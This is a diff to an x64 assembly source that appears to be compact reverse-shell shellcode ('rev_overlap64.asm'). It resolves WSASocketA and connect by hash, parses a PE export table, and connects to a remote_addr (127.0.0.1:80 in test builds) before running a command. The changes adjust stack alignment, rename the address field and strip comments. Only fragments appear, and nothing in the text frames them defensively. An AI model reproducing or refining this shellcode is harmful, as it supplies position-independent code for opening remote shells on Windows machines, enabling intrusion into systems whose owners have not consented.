@@ -36,7 +36,7 @@
   ; 
   ; jwasm -Zp8 -bin -I .\WinInc208\Include rev_overlap64.asm
   ;
-  ; Current size: 350 bytes
+  ; Current size: 351 bytes
   ;
 
   .x64
@@ -214,10 +214,8 @@ code_start:
     push   r14
     push   r15
     mov    r15, rsp
-    
-    ; align stack by 16 bytes
     and    rsp, -16
-    sub    rsp, 28h
+    sub    rsp, 78h
     stc
     jmp    exec_cmd
 calc_position:
@@ -230,7 +228,7 @@ calc_position:
     xor    eax, eax
     cdq
     mov    dl, STACK_SIZE
-    sub    esp, edx
+    sub    rsp, rdx
     mov    ecx, edx
     mov    rdi, rsp 
     rep    stosb
@@ -310,6 +308,7 @@ exec_cmd:
     
     ; fix up stack, restore non-volatile registers and return
     mov    rsp, r15
+    ;add    rsp, 68h
     pop    r15
     pop    r14
     pop    r13
@@ -326,11 +325,11 @@ load_data:
 data_section label qword
 ifdef TEST_CODE
 ; 127.0.0.1:80
-    local_address sockaddr_in4 <not AF_INET, \
+    remote_addr sockaddr_in4 <not AF_INET, \
                   not mhtons(REMOTE_PORT), \
       <<<not 7fh, not 00h, not 00h, not 01h>>>>
 else
-    local_address sockaddr_in4 <0>
+    remote_addr sockaddr_in4 <0>
 endif
     hashapi "WSASocketA"
     hashapi "connect"
@@ -355,7 +354,7 @@ load_dll:
     
     mov    eax, [rbp+3Ch]      ; IMAGE_DOS_HEADER.e_lfanew
     add    eax, 10h
-    mov    eax, [rbp+rax+78h]  ; IMAGE_NT_HEADERS.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
+    mov    eax, [rbp+rax+78h]
     lea    rsi, [rbp+rax+18h]  ; IMAGE_EXPORT_DIRECTORY.NumberOfNames
     lodsd
     xchg   eax, ecx
